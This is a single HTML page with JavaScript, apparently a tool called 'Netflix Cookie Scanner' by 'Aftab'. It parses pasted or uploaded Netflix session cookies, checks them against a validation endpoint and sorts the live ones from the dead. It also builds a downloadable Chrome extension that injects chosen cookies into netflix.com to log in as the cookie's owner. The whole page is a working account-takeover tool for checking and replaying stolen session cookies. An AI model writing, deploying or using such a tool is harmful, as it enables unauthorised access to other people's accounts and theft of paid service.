<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>NETFLIX COOKIE SCANNER — AFTAB</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
  *{margin:0;padding:0;box-sizing:border-box;font-family:'Share Tech Mono',monospace}
  body{background:#000;color:#39ff14;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding:20px}
  .container{background:#0a0a0a;border:3px solid #39ff14;border-radius:30px;padding:24px 16px;width:100%;max-width:480px;box-shadow:0 0 20px #39ff14,inset 0 0 20px rgba(57,255,20,0.2);text-align:center}
  .header{font-size:22px;font-weight:bold;line-height:1.2;margin-bottom:14px;text-shadow:0 0 10px #39ff14}
  .header span{display:block;font-size:15px;margin-top:5px}
  .badge{background:#39ff14;color:#000;padding:3px 12px;border-radius:20px;font-size:12px;font-weight:bold;display:inline-block;margin-top:5px;box-shadow:0 0 10px #39ff14}
  .status-line{font-size:12px;margin:10px 0}
  .dot{color:#39ff14;font-size:18px;animation:blink 1s infinite}
  @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
  .sub-status{font-size:11px;border-bottom:1px solid #39ff14;padding-bottom:8px;margin-bottom:14px}
  .section-title{font-size:13px;font-weight:bold;color:#ffcc00;margin-bottom:8px;text-align:left;border-left:4px solid #ffcc00;padding-left:8px}
  .checker-box{border:2px solid #ffcc00;border-radius:15px;padding:12px;margin-bottom:14px;background:rgba(255,204,0,0.05)}
  .checker-box textarea{width:100%;height:80px;background:#000;border:1px solid #39ff14;border-radius:10px;color:#39ff14;padding:10px;font-size:11px;resize:none;outline:none;font-family:'Share Tech Mono',monospace;box-sizing:border-box}
  .check-btn{background:#ffcc00;color:#000;border:none;border-radius:12px;padding:11px;width:100%;font-size:13px;font-weight:bold;cursor:pointer;margin-top:8px;box-shadow:0 0 10px #ffcc00}
  .check-btn:hover{transform:scale(1.02);box-shadow:0 0 20px #ffcc00}
  .upload-btn-wrapper{position:relative;overflow:hidden;display:inline-block;width:100%;margin-bottom:10px}
  .upload-btn{border:2px dashed #39ff14;color:#39ff14;background:transparent;padding:12px;border-radius:15px;font-size:12px;font-weight:bold;width:100%;cursor:pointer}
  .upload-btn:hover{background-color:rgba(57,255,20,0.1);box-shadow:0 0 15px #39ff14}
  .upload-btn-wrapper input[type=file]{position:absolute;left:0;top:0;opacity:0;cursor:pointer;height:100%;width:100%}
  .cookie-box{border:2px solid #39ff14;border-radius:20px;padding:10px;margin-bottom:12px;font-size:12px}
  .cookie-count{color:#ffcc00;font-weight:bold}
  .generate-btn{background:#39ff14;color:#000;border:none;border-radius:50px;padding:14px;width:100%;font-size:14px;font-weight:bold;cursor:pointer;box-shadow:0 0 20px #39ff14;margin-bottom:12px}
  .generate-btn:hover{transform:scale(1.02)}
  .action-btn{padding:12px;border-radius:15px;border:none;font-weight:bold;cursor:pointer;font-size:12px;text-decoration:none;text-align:center;width:100%;margin-bottom:8px}
  .action-btn.dl-btn{background:#00c8ff;color:#000;box-shadow:0 0 15px #00c8ff}
  .action-btn.bypass-btn{background:#ff0044;color:#fff;box-shadow:0 0 15px #ff0044;animation:pulseBypass 1.5s infinite}
  @keyframes pulseBypass{0%{box-shadow:0 0 10px #ff0044}50%{box-shadow:0 0 25px #ff0044,0 0 40px #ff0044}100%{box-shadow:0 0 10px #ff0044}}
  .results{margin-top:14px}
  .result-section{margin-bottom:16px;text-align:left}
  .result-header{font-size:13px;font-weight:bold;padding:8px 10px;border-radius:10px 10px 0 0}
  .result-header.valid{background:rgba(57,255,20,0.2);border:1px solid #39ff14;color:#39ff14}
  .result-header.invalid{background:rgba(255,0,0,0.2);border:1px solid #ff0000;color:#ff0000}
  .cookie-item{background:#000;border:1px solid #39ff14;border-radius:0 0 8px 8px;padding:10px;margin-bottom:6px;font-size:10px;word-break:break-all;color:#39ff14;position:relative}
  .cookie-item.invalid{border-color:#ff0000;color:#ff8888}
  .cookie-item .num{color:#ffcc00;font-weight:bold;font-size:11px;display:block;margin-bottom:4px}
  .cookie-item .data{max-height:70px;overflow-y:auto;display:block;line-height:1.4}
  .cookie-item .copy-btn{background:#39ff14;color:#000;border:none;padding:5px 12px;border-radius:8px;font-size:10px;font-weight:bold;cursor:pointer;margin-top:6px;margin-right:4px}
  .cookie-item .copy-btn:hover{background:#ffcc00}
  .cookie-item .bypass-btn-item{background:#ff0044;color:#fff;border:none;padding:5px 12px;border-radius:8px;font-size:10px;font-weight:bold;cursor:pointer;margin-top:6px}
  .cookie-item .bypass-btn-item:hover{background:#e50914}
  .footer{margin-top:20px;font-size:11px;color:#39ff14;text-align:center}
  .made-by{font-size:12px;font-weight:bold;color:#000;background:#39ff14;padding:5px 14px;border-radius:20px;box-shadow:0 0 15px #39ff14;text-transform:uppercase;letter-spacing:2px;display:inline-block}
  .loader{display:none;text-align:center;padding:12px;font-size:12px;color:#ffcc00}
  .loader.on{display:block}
</style>
</head>
<body>
<div class="container">
  <div class="header">NETFLIX COOKIE SCANNER<span>WEB <span class="badge">AFTAB</span></span></div>
  <div class="status-line"><span class="dot">●</span> CORE: SCAN // <span id="clock">00:00:00</span></div>
  <div class="sub-status">&gt;_ AUTO-FORMAT • SPLIT VALID/INVALID • COPY</div>

  <div class="checker-box">
    <div class="section-title">PASTE COOKIES (any format)</div>
    <textarea id="cookieInput" placeholder="paste cookies here — devtools table, string, json, one per line..."></textarea>
    <button class="check-btn" onclick="scanPasted()">SCAN PASTED</button>
  </div>

  <div class="upload-btn-wrapper">
    <button class="upload-btn">UPLOAD FILE (.txt / .json / .pdf)</button>
    <input type="file" id="cookieFileInput" accept=".txt,.json,.pdf" onchange="handleFile(event)" />
  </div>

  <div class="cookie-box">
    <div>TOTAL: <span class="cookie-count" id="totalCount">0</span> | VALID: <span class="cookie-count" id="validCount">0</span> | INVALID: <span class="cookie-count" id="invalidCount">0</span></div>
  </div>

  <button class="generate-btn" onclick="downloadExtension()">DOWNLOAD BYPASS EXTENSION</button>
  <button class="action-btn bypass-btn" onclick="openNetflix()">BYPASS &amp; OPEN NETFLIX</button>

  <div class="loader" id="loader">scanning... please wait</div>

  <div class="results" id="results"></div>

  <div class="footer"><div class="made-by">Made by Aftab</div></div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js"></script>
<script>
var validCookies=[];
var invalidCookies=[];
var currentRotateIndex=0;

function updateClock(){document.getElementById('clock').textContent=new Date().toLocaleTimeString('en-US',{hour12:false})}
setInterval(updateClock,1000);updateClock();

function playBeep(freq){
  try{
    var ctx=new (window.AudioContext||window.webkitAudioContext)();
    var o=ctx.createOscillator();
    o.type='sine';o.frequency.setValueAtTime(freq,ctx.currentTime);
    o.connect(ctx.destination);o.start();o.stop(ctx.currentTime+0.1);
  }catch(e){}
}

function extractCookies(raw){
  if(!raw) return '';
  var keep=['netflixid','securenetflixid','nfvdid'];
  var out={};
  var lines=raw.split('\n');
  for(var i=0;i<lines.length;i++){
    var line=lines[i];
    if(!line.trim()) continue;
    var cells=line.split('\t');
    if(cells.length>=7){
      var nm=cells[5].trim();
      var val=cells.slice(6).join('\t').trim();
      var low=nm.toLowerCase();
      if(keep.indexOf(low)>=0 && val) out[low]=nm+'='+val;
    }
  }
  if(Object.keys(out).length===0){
    var parts=raw.split(/[;\n]/);
    for(var j=0;j<parts.length;j++){
      var p=parts[j].trim();
      var eq=p.indexOf('=');
      if(eq<0) continue;
      var k=p.substring(0,eq).trim().toLowerCase();
      var v=p.substring(eq+1).trim();
      if(keep.indexOf(k)>=0 && v) out[k]=p.substring(0,eq).trim()+'='+v;
    }
  }
  if(Object.keys(out).length===0){
    try{
      var obj=JSON.parse(raw);
      if(Array.isArray(obj)){
        for(var m=0;m<obj.length;m++){
          var c=obj[m];
          if(c.name && c.value && keep.indexOf(c.name.toLowerCase())>=0)
            out[c.name.toLowerCase()]=c.name+'='+c.value;
        }
      }
    }catch(e){}
  }
  var arr=[];
  if(out['netflixid']) arr.push(out['netflixid']);
  if(out['securenetflixid']) arr.push(out['securenetflixid']);
  if(out['nfvdid']) arr.push(out['nfvdid']);
  return arr.join('; ');
}

async function validateCookie(normalized){
  try{
    var res=await fetch('/api/validate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:normalized,device:'mobile'})});
    var data=await res.json();
    return data.ok?{ok:true,profile:data.profile||'unknown'}:{ok:false,error:data.error||'rejected'};
  }catch(e){
    return {ok:false,error:e.message};
  }
}

async function scanPasted(){
  var raw=document.getElementById('cookieInput').value.trim();
  if(!raw){alert('paste cookies first');return}
  // split by double newline OR by lines that look like start of new cookie
  var chunks=raw.split(/\n\s*\n/);
  if(chunks.length===1){
    // try line by line
    var lines=raw.split('\n');
    var hasTable=lines.some(function(l){return l.split('\t').length>=7});
    if(!hasTable){
      chunks=lines.filter(function(l){return l.trim()});
    }
  }
  await processChunks(chunks);
}

async function handleFile(event){
  var file=event.target.files[0];
  if(!file) return;
  document.getElementById('loader').classList.add('on');
  var text='';

  if(file.name.toLowerCase().endsWith('.pdf')){
    try{
      var buf=await file.arrayBuffer();
      var pdf=await pdfjsLib.getDocument({data:buf}).promise;
      var full='';
      for(var p=1;p<=pdf.numPages;p++){
        var page=await pdf.getPage(p);
        var content=await page.getTextContent();
        var pageText=content.items.map(function(it){return it.str}).join(' ');
        full+=pageText+'\n';
      }
      text=full;
    }catch(e){
      alert('pdf read error: '+e.message);
      document.getElementById('loader').classList.remove('on');
      return;
    }
  }else{
    text=await file.text();
  }

  document.getElementById('loader').classList.remove('on');
  var chunks=text.split(/\n\s*\n/);
  if(chunks.length===1){
    var lines=text.split('\n');
    var hasTable=lines.some(function(l){return l.split('\t').length>=7});
    if(!hasTable) chunks=lines.filter(function(l){return l.trim()});
  }
  await processChunks(chunks);
}

async function processChunks(chunks){
  validCookies=[];
  invalidCookies=[];
  document.getElementById('results').innerHTML='';
  document.getElementById('loader').classList.add('on');

  for(var i=0;i<chunks.length;i++){
    var norm=extractCookies(chunks[i]);
    if(!norm) continue;
    var result=await validateCookie(norm);
    if(result.ok){
      validCookies.push({cookie:norm,profile:result.profile});
    }else{
      invalidCookies.push({cookie:norm,error:result.error});
    }
    document.getElementById('loader').textContent='scanned '+(i+1)+'/'+chunks.length+'...';
  }

  document.getElementById('loader').classList.remove('on');
  renderResults();
  playBeep(900);
}

function renderResults(){
  var html='';
  document.getElementById('totalCount').textContent=validCookies.length+invalidCookies.length;
  document.getElementById('validCount').textContent=validCookies.length;
  document.getElementById('invalidCount').textContent=invalidCookies.length;

  if(validCookies.length>0){
    html+='<div class="result-section"><div class="result-header valid">VALID COOKIES ('+validCookies.length+')</div>';
    for(var i=0;i<validCookies.length;i++){
      var v=validCookies[i];
      html+='<div class="cookie-item"><span class="num">#'+(i+1)+' — profile: '+v.profile+'</span><span class="data">'+v.cookie+'</span>';
      html+='<button class="copy-btn" onclick="copyCookie('+i+')">COPY</button>';
      html+='<button class="bypass-btn-item" onclick="useCookie('+i+')">USE</button></div>';
    }
    html+='</div>';
  }
  if(invalidCookies.length>0){
    html+='<div class="result-section"><div class="result-header invalid">INVALID COOKIES ('+invalidCookies.length+')</div>';
    for(var j=0;j<invalidCookies.length;j++){
      var vv=invalidCookies[j];
      html+='<div class="cookie-item invalid"><span class="num">#'+(j+1)+' — '+vv.error+'</span><span class="data">'+vv.cookie+'</span></div>';
    }
    html+='</div>';
  }
  if(html==='') html='<div style="text-align:center;color:#ffcc00;padding:12px">no cookies found</div>';
  document.getElementById('results').innerHTML=html;
}

function copyCookie(i){
  var c=validCookies[i].cookie;
  navigator.clipboard.writeText(c).then(function(){
    playBeep(900);
    alert('cookie #'+(i+1)+' copied to clipboard');
  }).catch(function(){
    alert('copy failed, cookie: '+c);
  });
}

function useCookie(i){
  var c=validCookies[i].cookie;
  navigator.clipboard.writeText(c).then(function(){
    alert('cookie #'+(i+1)+' copied. open extension and paste to inject.');
  });
}

function openNetflix(){
  if(validCookies.length===0){alert('scan a cookie first');return}
  window.open('https://www.netflix.com/browse','_blank');
}

function downloadExtension(){
  var manifest={manifest_version:3,name:'NF Cookie Injector by Aftab',version:'1.0',description:'inject netflix cookies',permissions:['cookies','tabs'],host_permissions:['https://*.netflix.com/*'],action:{default_popup:'popup.html'}};
  var popupHtml='<!doctype html><html><head><meta charset="utf-8"><style>body{width:300px;background:#000;color:#39ff14;font-family:monospace;padding:12px;margin:0}h3{margin:0 0 10px 0;font-size:14px}textarea{width:100%;height:110px;background:#000;color:#39ff14;border:1px solid #39ff14;padding:6px;font-size:11px;box-sizing:border-box;font-family:monospace}button{background:#39ff14;color:#000;border:none;padding:10px;font-weight:bold;cursor:pointer;width:100%;margin-top:8px;font-family:monospace}#s{margin-top:8px;font-size:11px;color:#ffcc00}</style></head><body><h3>NF Cookie Injector - Aftab</h3><textarea id="c" placeholder="NetflixId=...; SecureNetflixId=..."></textarea><button id="go">INJECT &amp; LOGIN</button><div id="s"></div><script src="popup.js"><\/script></body></html>';
  var popupJs="document.getElementById('go').onclick=async()=>{var raw=document.getElementById('c').value.trim();var s=document.getElementById('s');if(!raw){s.textContent='no cookie';return}s.textContent='injecting...';var parts=raw.split(/[;\\n]/).map(x=>x.trim()).filter(Boolean);var ok=0;for(var i=0;i<parts.length;i++){var p=parts[i];var eq=p.indexOf('=');if(eq<0)continue;var name=p.substring(0,eq).trim();var value=p.substring(eq+1).trim();if(!name||!value)continue;try{await chrome.cookies.set({url:'https://www.netflix.com/',name:name,value:value,domain:'.netflix.com',path:'/',secure:true,sameSite:'no_restriction',expirationDate:Math.floor(Date.now()/1000)+60*60*24*7});ok++}catch(e){console.log(e)}}s.textContent=ok+' cookies set';setTimeout(function(){chrome.tabs.create({url:'https://www.netflix.com/browse'});window.close()},700)};";
  var bg="console.log('NF injector loaded');";
  var zip=new JSZip();
  zip.file('manifest.json',JSON.stringify(manifest,null,2));
  zip.file('popup.html',popupHtml);
  zip.file('popup.js',popupJs);
  zip.file('background.js',bg);
  zip.generateAsync({type:'blob'}).then(function(blob){
    var a=document.createElement('a');
    a.href=URL.createObjectURL(blob);
    a.download='nf-injector-aftab.zip';
    a.click();
  });
}

if(window.pdfjsLib){pdfjsLib.GlobalWorkerOptions.workerSrc='https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js'}
</script>
</body>
</html>
